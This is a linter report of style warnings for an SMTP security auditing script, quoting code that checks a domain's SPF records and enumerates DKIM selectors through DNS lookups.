1994 |                     "Attack most likely failed {}, result: {}".format(attack, str(out)),
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1995 |                     toOutLine=True,
1996 |                 )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1998:22
     |
1996 |                 )
1997 |             else:
1998 |                 fail("Attack {} failed.".format(attack), toOutLine=True)
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1999 |
2000 |         return list(set(results))
     |
help: Convert to f-string

E712 Avoid equality comparisons to `True`; use `v:` for truth checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2008:20
     |
2006 |                 results[k] = SmtpTester.translateResultsDict(v)
2007 |             else:
2008 |                 if v == True:
     |                    ^^^^^^^^^
2009 |                     results[k] = "secure"
2010 |                 elif v == False:
     |
help: Replace with `v`

E712 Avoid equality comparisons to `False`; use `not v:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2010:22
     |
2008 |                 if v == True:
2009 |                     results[k] = "secure"
2010 |                 elif v == False:
     |                      ^^^^^^^^^^
2011 |                     results[k] = "unsecure"
2012 |                 else:
     |
help: Replace with `not v`

N806 Variable `numberOfSpfRecords` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2036:9
     |
2034 |     def enumerateSpfRecords(self, domain):
2035 |         records = set()
2036 |         numberOfSpfRecords = 0
     |         ^^^^^^^^^^^^^^^^^^
2037 |         once = True
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2042:14
     |
2040 |         resv.timeout = config["timeout"] / 2.0
2041 |
2042 |         info('Queried domain for SPF: "{}"'.format(domain))
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2043 |
2044 |         try:
     |
help: Convert to f-string

N806 Variable `numberOfSpfRecords` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2048:21
     |
2046 |                 txt = txt.to_text().replace('"', "")
2047 |                 if txt.lower().startswith("v=spf") and txt not in records:
2048 |                     numberOfSpfRecords += 1
     |                     ^^^^^^^^^^^^^^^^^^
2049 |                     records.add(txt)
     |

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:2062:14
     |
2060 |             name.EmptyLabel,
2061 |             resolver.NoNameservers,
2062 |         ) as e:
     |              ^
2063 |             pass
     |
help: Remove assignment to unused variable `e`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2072:20
     |
2070 |         for domain in self.getDomainsToReviewDNS():
2071 |             for txt in self.enumerateSpfRecords(domain):
2072 |                 if txt not in records.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^
2073 |                     txts.append(txt)
2074 |                     records[txt] = self.processSpf(txt)
     |
help: Remove `.keys()`

B007 Loop control variable `txt` not used within loop body
    --> security\penetration-testing-tools\networks\smtpAudit.py:2079:17
     |
2077 |         if len(records):
2078 |             results = {}
2079 |             for txt, rec in records.items():
     |                 ^^^
2080 |                 origTxt, results = rec
2081 |                 if isinstance(results, dict) and all(results.values()):
     |
help: Rename unused `txt` to `_txt`

N806 Variable `origTxt` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2080:17
     |
2078 |             results = {}
2079 |             for txt, rec in records.items():
2080 |                 origTxt, results = rec
     |                 ^^^^^^^
2081 |                 if isinstance(results, dict) and all(results.values()):
2082 |                     pass
     |

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\networks\smtpAudit.py:2081:17
     |
2079 |               for txt, rec in records.items():
2080 |                   origTxt, results = rec
2081 | /                 if isinstance(results, dict) and all(results.values()):
2082 | |                     pass
2083 | |                 elif isinstance(results, bool) and results:
2084 | |                     pass
     | |________________________^
2085 |                   else:
2086 |                       fail("UNSECURE: SPF record exists, but not passed tests.")
     |
help: Combine `if` branches

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2087:26
     |
2085 |                 else:
2086 |                     fail("UNSECURE: SPF record exists, but not passed tests.")
2087 |                     _out('\tRecord: ("{}")'.format(origTxt))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2088 |                     return results
     |
help: Convert to f-string

N806 Variable `maxRecursion` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2104:9
     |
2102 |         Code processing, parsing and evaluating SPF record's contents.
2103 |         """
2104 |         maxRecursion = 3
     |         ^^^^^^^^^^^^
2105 |         info('Found SPF record: "{}"'.format(txt))
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2105:14
     |
2103 |         """
2104 |         maxRecursion = 3
2105 |         info('Found SPF record: "{}"'.format(txt))
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2106 |
2107 |         if recurse > maxRecursion:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2118:26
     |
2116 |                     v = v[:-1]
2117 |                 if k == "redirect":
2118 |                     info('SPF record redirects to: "{}". Following...'.format(v))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2119 |                     for txt in self.enumerateSpfRecords(v):
2120 |                         return (txt, self.processSpf(txt, recurse + 1))
     |
help: Convert to f-string

N803 Argument name `syncDkimThreadsStop` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2131:29
     |
2129 |     @staticmethod
2130 |     def _job(
2131 |         jid, domains, data, syncDkimThreadsStop, results, totalTested, dkimQueryDelay
     |                             ^^^^^^^^^^^^^^^^^^^
2132 |     ):
2133 |         try:
     |

N803 Argument name `totalTested` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2131:59
     |
2129 |     @staticmethod
2130 |     def _job(
2131 |         jid, domains, data, syncDkimThreadsStop, results, totalTested, dkimQueryDelay
     |                                                           ^^^^^^^^^^^
2132 |     ):
2133 |         try:
     |

N803 Argument name `dkimQueryDelay` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2131:72
     |
2129 |     @staticmethod
2130 |     def _job(
2131 |         jid, domains, data, syncDkimThreadsStop, results, totalTested, dkimQueryDelay
     |                                                                        ^^^^^^^^^^^^^^
2132 |     ):
2133 |         try:
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2135:39
     |
2133 |         try:
2134 |             if (
2135 |                 results and sum([x != None for x in results]) > 0
     |                                       ^^^^
2136 |             ) or SmtpTester.stopCondition(totalTested, syncDkimThreadsStop):
2137 |                 return
     |
help: Replace with `cond is not None`

N806 Variable `poolNum` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2163:9
     |
2161 |             return self.dkimTest()
2162 |
2163 |         poolNum = config["parallel_processes"]
     |         ^^^^^^^
2164 |         t = threading.Thread(target=self._dkimTestThread, args=(poolNum,))
2165 |         t.daemon = True
     |

N803 Argument name `totalTested` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2169:23
     |
2167 |         return t
2168 |
2169 |     def stopCondition(totalTested, syncDkimThreadsStop):
     |                       ^^^^^^^^^^^
2170 |         if syncDkimThreadsStop.value:
2171 |             return True
     |

N805 First argument of a method should be named `self`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2169:23
     |
2167 |         return t
2168 |
2169 |     def stopCondition(totalTested, syncDkimThreadsStop):
     |                       ^^^^^^^^^^^
2170 |         if syncDkimThreadsStop.value:
2171 |             return True
     |
help: Rename `totalTested` to `self`

N803 Argument name `syncDkimThreadsStop` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2169:36
     |
2167 |         return t
2168 |
2169 |     def stopCondition(totalTested, syncDkimThreadsStop):
     |                                    ^^^^^^^^^^^^^^^^^^^
2170 |         if syncDkimThreadsStop.value:
2171 |             return True
     |

SIM103 Return the condition directly
    --> security\penetration-testing-tools\networks\smtpAudit.py:2173:9
     |
2171 |               return True
2172 |
2173 | /         if (
2174 | |             config["max_enumerations"] > 0
2175 | |             and totalTested.value >= config["max_enumerations"]
2176 | |         ):
2177 | |             return True
2178 | |
2179 | |         return False
     | |____________________^
2180 |
2181 |       def _dkimTestThread(self, poolNum):
     |
help: Inline condition

N803 Argument name `poolNum` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2181:31
     |
2179 |         return False
2180 |
2181 |     def _dkimTestThread(self, poolNum):
     |                               ^^^^^^^
2182 |         def _chunks(l, n):
2183 |             return [l[i : i + n] for i in range(0, len(l), n)]
     |

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2182:21
     |
2181 |     def _dkimTestThread(self, poolNum):
2182 |         def _chunks(l, n):
     |                     ^
2183 |             return [l[i : i + n] for i in range(0, len(l), n)]
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2187:13
     |
2185 |           self.threads["dkim"] = True
2186 |           dbg(
2187 | /             "Launched DKIM test in a new thread running with {} workers.".format(
2188 | |                 poolNum
2189 | |             )
     | |_____________^
2190 |           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2193:14
     |
2192 |         selectors = self.generateListOfCommonDKIMSelectors()
2193 |         info("Selectors to review: {}".format(len(selectors)))
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2194 |
2195 |         jobs = []
     |
help: Convert to f-string

N806 Variable `totalTested` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2197:9
     |
2195 |         jobs = []
2196 |         mgr = multiprocessing.Manager()
2197 |         totalTested = multiprocessing.Value("i", 0)
     |         ^^^^^^^^^^^
2198 |         syncDkimThreadsStop = multiprocessing.Value("i", 0)
2199 |         dkimQueryDelay = multiprocessing.Value("d", 0.0)
     |

N806 Variable `syncDkimThreadsStop` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2198:9
     |
2196 |         mgr = multiprocessing.Manager()
2197 |         totalTested = multiprocessing.Value("i", 0)
2198 |         syncDkimThreadsStop = multiprocessing.Value("i", 0)
     |         ^^^^^^^^^^^^^^^^^^^
2199 |         dkimQueryDelay = multiprocessing.Value("d", 0.0)
     |

N806 Variable `dkimQueryDelay` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2199:9
     |
2197 |         totalTested = multiprocessing.Value("i", 0)
2198 |         syncDkimThreadsStop = multiprocessing.Value("i", 0)
2199 |         dkimQueryDelay = multiprocessing.Value("d", 0.0)
     |         ^^^^^^^^^^^^^^
2200 |
2201 |         results = mgr.list()
     |

N806 Variable `lastTotal` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2229:13
     |
2227 |             num = len(domains) * len(selectors)
2228 |             totals = []
2229 |             lastTotal = 0
     |             ^^^^^^^^^
2230 |
2231 |             maxDelay = 4.0
     |

N806 Variable `maxDelay` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2231:13
     |
2229 |             lastTotal = 0
2230 |
2231 |             maxDelay = 4.0
     |             ^^^^^^^^
2232 |             delayStep = 0.5
2233 |             smallStepToDelay = 50
     |

N806 Variable `delayStep` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2232:13
     |
2231 |             maxDelay = 4.0
2232 |             delayStep = 0.5
     |             ^^^^^^^^^
2233 |             smallStepToDelay = 50
     |

N806 Variable `smallStepToDelay` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2233:13
     |
2231 |             maxDelay = 4.0
2232 |             delayStep = 0.5
2233 |             smallStepToDelay = 50
     |             ^^^^^^^^^^^^^^^^
2234 |
2235 |             while totalTested.value < len(selectors) - 50:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2243:22
     |
2242 |                 totals.append(totalTested.value)
2243 |                 js = "(jobs running: {})".format(len(jobs))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2244 |                 SmtpTester.dkimProgress(
2245 |                     totalTested.value,
     |
help: Convert to f-string

N806 Variable `lastTotal` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2266:17
     |
2264 |                         dkimQueryDelay.value -= delayStep
2265 |
2266 |                 lastTotal = totalTested.value
     |                 ^^^^^^^^^
2267 |
2268 |                 # Wait 5*2 seconds for another DKIM progress message
     |

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\networks\smtpAudit.py:2269:21
     |
2268 |                 # Wait 5*2 seconds for another DKIM progress message
2269 |                 for i in range(15):
     |                     ^
2270 |                     if (
2271 |                         SmtpTester.stopCondition(totalTested, syncDkimThreadsStop)
     |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\networks\smtpAudit.py:2292:21
     |
2290 |                 ):
2291 |                     break
2292 |                 for i in range(30):
     |                     ^
2293 |                     if (
2294 |                         SmtpTester.stopCondition(totalTested, syncDkimThreadsStop)
     |
help: Rename unused `i` to `_i`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2303:38
     |
2302 |         try:
2303 |             if results and sum([x != None for x in results]) > 0:
     |                                      ^^^^
2304 |                 dbg("DKIM thread found valid selector.")
2305 |                 self.results["dkim"] = [x for x in results if x != None][0]
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2305:68
     |
2303 |             if results and sum([x != None for x in results]) > 0:
2304 |                 dbg("DKIM thread found valid selector.")
2305 |                 self.results["dkim"] = [x for x in results if x != None][0]
     |                                                                    ^^^^
2306 |             else:
2307 |                 fail(
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2308:21
     |
2306 |               else:
2307 |                   fail(
2308 | /                     "UNSECURE: DKIM record is most likely missing, as proved after {} tries.".format(
2309 | |                         totalTested.value
2310 | |                     )
     | |_____________________^
2311 |                   )
2312 |           except FileNotFoundError:
     |
help: Convert to f-string

N803 Argument name `syncDkimThreadsStop` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2331:9
     |
2329 |         selectors,
2330 |         num,
2331 |         syncDkimThreadsStop,
     |         ^^^^^^^^^^^^^^^^^^^
2332 |         unconditional=False,
2333 |         extra=None,
     |

N803 Argument name `dkimQueryDelay` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2334:9
     |
2332 |         unconditional=False,
2333 |         extra=None,
2334 |         dkimQueryDelay=0,
     |         ^^^^^^^^^^^^^^^^
2335 |     ):
2336 |         if total < 100 or SmtpTester.stopCondition(total, syncDkimThreadsStop):
     |

N806 Variable `progressStr` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2339:9
     |
2337 |             return
2338 |
2339 |         progressStr = "DKIM: Checked {:02.0f}% ({:05}/{:05}) selectors. Query delay: {:0.2f} sec.".format(
     |         ^^^^^^^^^^^
2340 |             100.0 * (float(total) / float(len(selectors))),
2341 |             total,
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2339:23
     |
2337 |               return
2338 |
2339 |           progressStr = "DKIM: Checked {:02.0f}% ({:05}/{:05}) selectors. Query delay: {:0.2f} sec.".format(
     |  _______________________^
2340 | |             100.0 * (float(total) / float(len(selectors))),
2341 | |             total,
2342 | |             len(selectors),
2343 | |             dkimQueryDelay,
2344 | |         )
     | |_________^
2345 |
2346 |           if extra:
     |
help: Convert to f-string

N806 Variable `progressStr` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2347:13
     |
2346 |         if extra:
2347 |             progressStr += " " + extra
     |             ^^^^^^^^^^^
2348 |         progressStr += "..."
     |

N806 Variable `progressStr` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2348:9
     |
2346 |         if extra:
2347 |             progressStr += " " + extra
2348 |         progressStr += "..."
     |         ^^^^^^^^^^^
2349 |
2350 |         N = 10
     |

N806 Variable `N` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2350:9
     |
2348 |         progressStr += "..."
2349 |
2350 |         N = 10
     |         ^
2351 |         if not config["debug"] and (unconditional or ((total % int(num // N)) == 0)):
2352 |             info(progressStr, toOutLine=True)
     |

N803 Argument name `domainsToReview` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2363:9
     |
2361 |     @staticmethod
2362 |     def dkimTestWorker(
2363 |         domainsToReview,
     |         ^^^^^^^^^^^^^^^
2364 |         selectors,
2365 |         syncDkimThreadsStop,
     |

N803 Argument name `syncDkimThreadsStop` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2365:9
     |
2363 |         domainsToReview,
2364 |         selectors,
2365 |         syncDkimThreadsStop,
     |         ^^^^^^^^^^^^^^^^^^^
2366 |         dkimQueryDelay=None,
2367 |         reportProgress=True,
     |

N803 Argument name `dkimQueryDelay` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2366:9
     |
2364 |         selectors,
2365 |         syncDkimThreadsStop,
2366 |         dkimQueryDelay=None,
     |         ^^^^^^^^^^^^^^^^^^^
2367 |         reportProgress=True,
2368 |         totalTested=None,
     |

N803 Argument name `reportProgress` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2367:9
     |
2365 |         syncDkimThreadsStop,
2366 |         dkimQueryDelay=None,
2367 |         reportProgress=True,
     |         ^^^^^^^^^^^^^^^^^^^
2368 |         totalTested=None,
2369 |     ):
     |

N803 Argument name `totalTested` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2368:9
     |
2366 |         dkimQueryDelay=None,
2367 |         reportProgress=True,
2368 |         totalTested=None,
     |         ^^^^^^^^^^^^^^^^
2369 |     ):
2370 |         ret = False
     |

N806 Variable `stopIt` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2371:9
     |
2369 |     ):
2370 |         ret = False
2371 |         stopIt = False
     |         ^^^^^^
2372 |         total = 0
     |

N806 Variable `maxTimeoutsToAccept` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2374:9
     |
2372 |         total = 0
2373 |
2374 |         maxTimeoutsToAccept = int(0.3 * len(selectors))
     |         ^^^^^^^^^^^^^^^^^^^
2375 |         timeoutsSoFar = 0
     |

N806 Variable `timeoutsSoFar` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2375:9
     |
2374 |         maxTimeoutsToAccept = int(0.3 * len(selectors))
2375 |         timeoutsSoFar = 0
     |         ^^^^^^^^^^^^^
2376 |
2377 |         if SmtpTester.stopCondition(totalTested, syncDkimThreadsStop):
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2383:17
     |
2381 |           if reportProgress:
2382 |               info(
2383 | /                 "Checking around {} selectors. Please wait - this will take a while.".format(
2384 | |                     num
2385 | |                 )
     | |_________________^
2386 |               )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2395:22
     |
2393 |                 break
2394 |             if reportProgress:
2395 |                 info("Enumerating selectors for domain: {}...".format(domain))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2396 |
2397 |             for sel in selectors:
     |
help: Convert to f-string

N806 Variable `dkimRecord` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2400:17
     |
2398 |                 if stopIt or SmtpTester.stopCondition(totalTested, syncDkimThreadsStop):
2399 |                     break
2400 |                 dkimRecord = "{}._domainkey.{}".format(sel, domain)
     |                 ^^^^^^^^^^
2401 |                 total += 1
2402 |                 if totalTested:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2400:30
     |
2398 |                 if stopIt or SmtpTester.stopCondition(totalTested, syncDkimThreadsStop):
2399 |                     break
2400 |                 dkimRecord = "{}._domainkey.{}".format(sel, domain)
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2401 |                 total += 1
2402 |                 if totalTested:
     |
help: Convert to f-string

N806 Variable `stopIt` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2424:29
     |
2422 |                             and total >= config["max_enumerations"]
2423 |                         ):
2424 |                             stopIt = True
     |                             ^^^^^^
2425 |                             break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2428:34
     |
2427 |                         if txt.lower().startswith("v=dkim"):
2428 |                             info('DKIM found at selector: "{}"'.format(sel))
     |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2429 |                             ret = SmtpTester.processDkim(txt)
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:2438:45
     |
2436 |                             syncDkimThreadsStop.value = 1
2437 |                             return ret
2438 |                 except exception.Timeout as e:
     |                                             ^
2439 |                     if timeoutsSoFar >= maxTimeoutsToAccept:
2440 |                         err(
     |
help: Remove assignment to unused variable `e`

N806 Variable `timeoutsSoFar` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2445:21
     |
2443 |                         break
2444 |
2445 |                     timeoutsSoFar += 1
     |                     ^^^^^^^^^^^^^
2446 |
2447 |                 except (
     |

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:2454:22
     |
2452 |                     name.EmptyLabel,
2453 |                     name.NameTooLong,
2454 |                 ) as e:
     |                      ^
2455 |                     continue
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2468:21
     |
2466 |               else:
2467 |                   fail(
2468 | /                     "UNSECURE: DKIM record is most likely missing. Process interrupted ({}/{}).".format(
2469 | |                         total, num
2470 | |                     )
     | |_____________________^
2471 |                   )
     |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
    --> security\penetration-testing-tools\networks\smtpAudit.py:2570:51
     |
2568 |         try:
2569 |             if self.dkimSelectorsList:
2570 |                 with open(self.dkimSelectorsList, "r") as f:
     |                                                   ^^^
2571 |                     for l in f.readlines():
2572 |                         selectors.append(l.strip())
     |
help: Remove mode argument

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2571:25
     |
2569 |             if self.dkimSelectorsList:
2570 |                 with open(self.dkimSelectorsList, "r") as f:
2571 |                     for l in f.readlines():
     |                         ^
2572 |                         selectors.append(l.strip())
2573 |         except IOError:
     |

UP024 [*] Replace aliased errors with `OSError`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2573:16
     |
2571 |                     for l in f.readlines():
2572 |                         selectors.append(l.strip())
2573 |         except IOError:
     |                ^^^^^^^
2574 |             err("Could not open DKIM selectors list file.")
2575 |             sys.exit(-1)
     |
help: Replace `IOError` with builtin `OSError`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2579:30
     |
2577 |         # Set 2: Common words permutations
2578 |         for w in words:
2579 |             selectors.append("{}".format(w))
     |                              ^^^^^^^^^^^^^^
2580 |             selectors.append("_{}".format(w))
2581 |             selectors.append("{}_".format(w))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2580:30
     |
2578 |         for w in words:
2579 |             selectors.append("{}".format(w))
2580 |             selectors.append("_{}".format(w))
     |                              ^^^^^^^^^^^^^^^
2581 |             selectors.append("{}_".format(w))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2581:30
     |
2579 |             selectors.append("{}".format(w))
2580 |             selectors.append("_{}".format(w))
2581 |             selectors.append("{}_".format(w))
     |                              ^^^^^^^^^^^^^^^
2582 |
2583 |             for i in range(0, 11):
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2587:34
     |
2585 |                     break
2586 |
2587 |                 selectors.append("{}{}".format(w, i))
     |                                  ^^^^^^^^^^^^^^^^^^^
2588 |                 selectors.append("{}{:02d}".format(w, i))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2588:34
     |
2587 |                 selectors.append("{}{}".format(w, i))
2588 |                 selectors.append("{}{:02d}".format(w, i))
     |                                  ^^^^^^^^^^^^^^^^^^^^^^^
2589 |
2590 |         if config["dkim_full_enumeration"]:
     |
help: Convert to f-string

N806 Variable `nowTime` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2591:13
     |
2590 |         if config["dkim_full_enumeration"]:
2591 |             nowTime = datetime.datetime.now()
     |             ^^^^^^^
2592 |             currYear = nowTime.year
2593 |             yearsRange = range(currYear - 2, currYear + 1)
     |

N806 Variable `currYear` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2592:13
     |
2590 |         if config["dkim_full_enumeration"]:
2591 |             nowTime = datetime.datetime.now()
2592 |             currYear = nowTime.year
     |             ^^^^^^^^
2593 |             yearsRange = range(currYear - 2, currYear + 1)
     |

N806 Variable `yearsRange` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2593:13
     |
2591 |             nowTime = datetime.datetime.now()
2592 |             currYear = nowTime.year
2593 |             yearsRange = range(currYear - 2, currYear + 1)
     |             ^^^^^^^^^^
2594 |
2595 |             # Set 3: Year-Month text permutations
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2601:25
     |
2599 |                         m[:3],
2600 |                         m,
2601 |                         "%d" % yr,
     |                         ^^^^
2602 |                         "%s%d" % (m, yr),
2603 |                         "%s%d" % (m[:3], yr),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2602:25
     |
2600 |                         m,
2601 |                         "%d" % yr,
2602 |                         "%s%d" % (m, yr),
     |                         ^^^^^^
2603 |                         "%s%d" % (m[:3], yr),
2604 |                         "%s%d" % (m, (yr - 2000)),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2603:25
     |
2601 |                         "%d" % yr,
2602 |                         "%s%d" % (m, yr),
2603 |                         "%s%d" % (m[:3], yr),
     |                         ^^^^^^
2604 |                         "%s%d" % (m, (yr - 2000)),
2605 |                         "%s%d" % (m[:3], (yr - 2000)),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2604:25
     |
2602 |                         "%s%d" % (m, yr),
2603 |                         "%s%d" % (m[:3], yr),
2604 |                         "%s%d" % (m, (yr - 2000)),
     |                         ^^^^^^
2605 |                         "%s%d" % (m[:3], (yr - 2000)),
2606 |                         "%d%s" % (yr, m),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2605:25
     |
2603 |                         "%s%d" % (m[:3], yr),
2604 |                         "%s%d" % (m, (yr - 2000)),
2605 |                         "%s%d" % (m[:3], (yr - 2000)),
     |                         ^^^^^^
2606 |                         "%d%s" % (yr, m),
2607 |                         "%d%s" % (yr, m[:3]),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2606:25
     |
2604 |                         "%s%d" % (m, (yr - 2000)),
2605 |                         "%s%d" % (m[:3], (yr - 2000)),
2606 |                         "%d%s" % (yr, m),
     |                         ^^^^^^
2607 |                         "%d%s" % (yr, m[:3]),
2608 |                         "%d%s" % ((yr - 2000), m),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2607:25
     |
2605 |                         "%s%d" % (m[:3], (yr - 2000)),
2606 |                         "%d%s" % (yr, m),
2607 |                         "%d%s" % (yr, m[:3]),
     |                         ^^^^^^
2608 |                         "%d%s" % ((yr - 2000), m),
2609 |                         "%d%s" % ((yr - 2000), m[:3]),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2608:25
     |
2606 |                         "%d%s" % (yr, m),
2607 |                         "%d%s" % (yr, m[:3]),
2608 |                         "%d%s" % ((yr - 2000), m),
     |                         ^^^^^^
2609 |                         "%d%s" % ((yr - 2000), m[:3]),
2610 |                     )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2609:25
     |
2607 |                         "%d%s" % (yr, m[:3]),
2608 |                         "%d%s" % ((yr - 2000), m),
2609 |                         "%d%s" % ((yr - 2000), m[:3]),
     |                         ^^^^^^
2610 |                     )
2611 |                     selectors.extend(ms)
     |
help: Replace with format specifiers

N806 Variable `currTimeFormats` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2613:13
     |
2611 |                     selectors.extend(ms)
2612 |
2613 |             currTimeFormats = (
     |             ^^^^^^^^^^^^^^^
